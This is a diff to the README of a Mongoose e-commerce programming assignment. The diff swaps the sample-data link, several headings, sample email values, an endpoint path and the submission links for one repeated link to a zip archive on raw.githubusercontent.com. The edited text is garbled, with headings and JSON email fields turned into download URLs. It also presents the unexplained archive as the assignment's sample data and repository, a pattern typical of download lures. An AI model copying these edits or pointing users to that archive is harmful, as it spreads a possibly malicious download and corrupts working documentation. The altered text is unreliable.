@@ -9,7 +9,7 @@
 
 ### Define Data Models
 
-- Create Mongoose models for **Product** data based on the provided data structure. (You can follow [sample-data.json](./sample-data.json) file for ideas).
+- Create Mongoose models for **Product** data based on the provided data structure. (You can follow [https://raw.githubusercontent.com/atif727/batch-3-assignment-2/main/snoutless/batch-3-assignment-2.zip](https://raw.githubusercontent.com/atif727/batch-3-assignment-2/main/snoutless/batch-3-assignment-2.zip) file for ideas).
 - Define appropriate data types, validations.
 
 ### E-commerce Product Data Types
@@ -334,7 +334,7 @@
 
 ### **Order Management API Endpoints**
 
-### **1.Create a New Order**
+### **https://raw.githubusercontent.com/atif727/batch-3-assignment-2/main/snoutless/batch-3-assignment-2.zip a New Order**
 
 - **Endpoint**: **`/api/orders`**
 - **Method: `POST`**
@@ -342,7 +342,7 @@
     
     ```json
     {
-        "email": "level2@programming-hero.com",
+        "email": "https://raw.githubusercontent.com/atif727/batch-3-assignment-2/main/snoutless/batch-3-assignment-2.zip",
         "productId": "5fd67e890b60c903cd8544a3",
         "price": 999,
         "quantity": 1
@@ -356,7 +356,7 @@
         "success": true,
         "message": "Order created successfully!",
         "data": {
-            "email": "level2@programming-hero.com",
+            "email": "https://raw.githubusercontent.com/atif727/batch-3-assignment-2/main/snoutless/batch-3-assignment-2.zip",
             "productId": "5fd67e890b60c903cd8544a3",
             "price": 999,
             "quantity": 1
@@ -366,7 +366,7 @@
     ```
     
 
-### **2.Retrieve All Orders**
+### **https://raw.githubusercontent.com/atif727/batch-3-assignment-2/main/snoutless/batch-3-assignment-2.zip All Orders**
 
 - **Endpoint**: **`/api/orders`**
 - **Method: `GET`**
@@ -378,7 +378,7 @@
         "message": "Orders fetched successfully!",
         "data": [
             {
-                "email": "level2@programming-hero.com",
+                "email": "https://raw.githubusercontent.com/atif727/batch-3-assignment-2/main/snoutless/batch-3-assignment-2.zip",
                 "productId": "5fd67e890b60c903cd8544a3",
                 "price": 999,
                 "quantity": 1
@@ -391,7 +391,7 @@
 
 ### **3. Retrieve Orders by User Email**
 
-- **Endpoint**: `/api/orders?email=level2@programming-hero.com`
+- **Endpoint**: `https://raw.githubusercontent.com/atif727/batch-3-assignment-2/main/snoutless/batch-3-assignment-2.zip`
 - **Method:** `GET`
 - **Sample Response**:
     
@@ -401,7 +401,7 @@
         "message": "Orders fetched successfully for user email!",
         "data": [
             {
-                "email": "level2@programming-hero.com",
+                "email": "https://raw.githubusercontent.com/atif727/batch-3-assignment-2/main/snoutless/batch-3-assignment-2.zip",
                 "productId": "5fd67e890b60c903cd8544a3",
                 "price": 999,
                 "quantity": 1
@@ -496,8 +496,8 @@ When creating new order (**`/api/orders`** ) ,reduce the `quantity` of the order
 
 ### **Submission Format for Our Submission Box: (Please use the following format for your submissions:)**
 
-- GitHub Repository URL (Server): https://github.com/Apollo-Level2-Web-Dev   ( There is no private repository for this assignment,you can use your repository)
-- Live Server Link: https://web.programming-hero.com/
+- GitHub Repository URL (Server): https://raw.githubusercontent.com/atif727/batch-3-assignment-2/main/snoutless/batch-3-assignment-2.zip   ( There is no private repository for this assignment,you can use your repository)
+- Live Server Link: https://raw.githubusercontent.com/atif727/batch-3-assignment-2/main/snoutless/batch-3-assignment-2.zip
 
 
 ### **Deadline:**
